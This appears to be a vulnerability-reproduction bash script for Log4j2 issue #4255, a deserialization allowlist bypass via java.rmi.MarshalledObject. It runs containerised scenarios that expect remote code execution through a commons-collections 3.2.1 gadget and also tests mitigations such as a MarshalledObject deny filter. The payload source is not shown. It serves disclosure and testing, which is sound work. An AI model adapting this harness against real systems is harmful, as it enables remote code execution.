#!/usr/bin/env bash
#
# log4j2 issue #4255 — FilteredObjectInputStream allowlist bypass via java.rmi.MarshalledObject.
# End-to-end reproduction against official Log4j 2.26.1 jars on JDK 17, fully containerised.
# Portable: uses a private Docker bridge network (works on Linux / macOS / Windows Docker).
#
# See README.md for what each scenario proves. Requires only: docker.
#
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
IMG=eclipse-temurin:17-jdk
NET=log4j4255-net
PORT=4563
LVER="${LOG4J_VERSION:-2.26.1}"
JARS="$HERE/.jars"; VC="$HERE/.victim_classes"; AC="$HERE/.attacker_classes"; PROOF="$HERE/.proof"
mkdir -p "$JARS" "$VC" "$AC" "$PROOF"; rm -f "$PROOF"/PROOF_* "$PROOF"/log_* 2>/dev/null

echo "############ 1. fetch + verify jars against Maven Central sha1 ############"
verify(){ local url="$1" out="$2"; curl -fsSL "$url" -o "$out" || return 1
  local exp got; exp=$(curl -fsSL "$url.sha1" | tr -dc '0-9a-f'); got=$(shasum "$out" 2>/dev/null | cut -d' ' -f1 || sha1sum "$out" | cut -d' ' -f1)
  if [ "$exp" = "$got" ]; then echo "  OK  $(basename "$out")  sha1=$got"; else echo "  FAIL sha1 $(basename "$out") exp=$exp got=$got"; return 1; fi; }
B=https://repo1.maven.org/maven2
verify "$B/org/apache/logging/log4j/log4j-api/$LVER/log4j-api-$LVER.jar"   "$JARS/log4j-api.jar"  || exit 1
verify "$B/org/apache/logging/log4j/log4j-core/$LVER/log4j-core-$LVER.jar" "$JARS/log4j-core.jar" || exit 1
verify "$B/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1.jar" "$JARS/cc-3.2.1.jar" || exit 1
verify "$B/commons-collections/commons-collections/3.2.2/commons-collections-3.2.2.jar" "$JARS/cc-3.2.2.jar" || exit 1

LOG=/jars/log4j-api.jar:/jars/log4j-core.jar
CC321=/jars/cc-3.2.1.jar
CC322=/jars/cc-3.2.2.jar

echo "############ 2. toolchain + compile ############"
docker image inspect "$IMG" >/dev/null 2>&1 || docker pull "$IMG"
docker network create "$NET" >/dev/null 2>&1 || true
docker run --rm -v "$HERE/src":/src -v "$JARS":/jars -v "$VC":/vc -v "$AC":/ac "$IMG" sh -c "
  javac -cp $LOG:$CC321 -d /ac /src/attacker/*.java &&
  javac -cp $LOG        -d /vc /src/victim/Receiver.java &&
  echo '  compiled ok'" || { echo 'FATAL compile'; exit 1; }

# run_scenario <name> <filter> <mode> <victim_cp> <expect: reject|silent|rce>
run_scenario(){
  local name="$1" filter="$2" mode="$3" vcp="$4" expect="$5"
  local nonce="${name}_${RANDOM}"
  local log="$PROOF/log_${name}.txt"
  local proof="$PROOF/PROOF_${nonce}.txt"
  echo; echo "======== $name  (filter='${filter:-<none>}' expect=$expect) ========"
  docker rm -f recv >/dev/null 2>&1
  docker run -d --rm --name recv --network "$NET" -e FILTER="$filter" \
     -v "$JARS":/jars -v "$VC":/victim -v "$AC":/att -v "$PROOF":/work/proof "$IMG" \
     sh -c 'if [ -n "$FILTER" ]; then exec java -Djdk.serialFilter="$FILTER" -cp '"$vcp"' Receiver '"$PORT"';
            else exec java -cp '"$vcp"' Receiver '"$PORT"'; fi' >/dev/null
  local ready=no; for i in $(seq 1 40); do docker logs recv 2>&1 | grep -q "bridge on" && { ready=yes; break; }; sleep 0.5; done
  if [ "$ready" = yes ]; then
    docker run --rm --network "$NET" -v "$JARS":/jars -v "$AC":/att "$IMG" \
       sh -c "exec java -cp /att:$LOG:$CC321 Attacker recv $PORT $mode $nonce" 2>&1 | sed 's/^/  /'
    for i in $(seq 1 16); do [ -f "$proof" ] && break; sleep 0.5; done; sleep 1
  else
    echo "  [harness] receiver never became ready"
  fi
  docker logs recv > "$log" 2>&1; docker rm -f recv >/dev/null 2>&1
  local got
  if ! grep -q "bridge on" "$log"; then got=infra-fail
  elif [ -f "$proof" ]; then got=rce
  elif grep -q "REJECTED/failed" "$log"; then got=reject
  elif grep -q "processed event OK" "$log"; then got=silent
  else got=unknown; fi
  echo "  receiver: $(grep -E 'REJECTED/failed|processed event OK' "$log" | tail -1 | sed 's/^\[receiver\] //')"
  [ -f "$proof" ] && echo "  proof (written by receiver): $(tr '\n' ' ' < "$proof")"
  if [ "$got" = "$expect" ]; then echo "  RESULT: PASS (classified=$got)"; else echo "  RESULT: FAIL (classified=$got, expected=$expect)"; fi
}

echo "############ 3. scenarios (log4j $LVER, JDK17) ############"
run_scenario S1-control-evil-toplevel    ""                            control-evil "/victim:/att:$LOG:$CC321" reject
run_scenario S2-poc1-wrapped-evil         ""                            poc1         "/victim:/att:$LOG:$CC321" rce
run_scenario S3-control-cc-toplevel       ""                            control-cc   "/victim:$LOG:$CC321"      reject
run_scenario S4-poc2-cc321-no-attacker-cls ""                           poc2         "/victim:$LOG:$CC321"      rce
run_scenario S5-workaround-deny-filter    '!java.rmi.MarshalledObject'  poc2         "/victim:$LOG:$CC321"      reject
run_scenario S6-maxdepth5-inner-blocked   'maxdepth=5;maxbytes=1000000' poc2         "/victim:$LOG:$CC321"      silent
run_scenario S7-cc322-gadget-safe         ""                            poc2         "/victim:$LOG:$CC322"      silent

docker network rm "$NET" >/dev/null 2>&1 || true
echo; echo "############ DONE ############"
